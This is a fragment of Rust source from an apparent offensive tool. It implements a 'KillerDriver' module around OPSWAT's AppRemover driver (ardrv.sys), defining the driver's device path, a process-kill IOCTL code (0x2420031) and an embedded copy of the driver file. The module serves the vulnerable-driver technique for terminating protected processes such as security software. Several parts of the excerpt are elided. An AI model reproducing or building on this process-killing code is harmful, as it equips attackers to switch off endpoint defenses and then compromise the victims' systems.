...
const DRIVER_NAME: &str = "ardrv";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\ardrv";
const IOCTL_KILL: u32 = 0x2420031;
...
impl KillerDriver for ARDRV {
    ...
    fn description(&self) -> &'static str {
        return "OPSWAT, Inc. AppRemover Driver (ardrv.sys)";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = include_packed!("drivers/ardrv.sys");
        return Ok(v);
    }
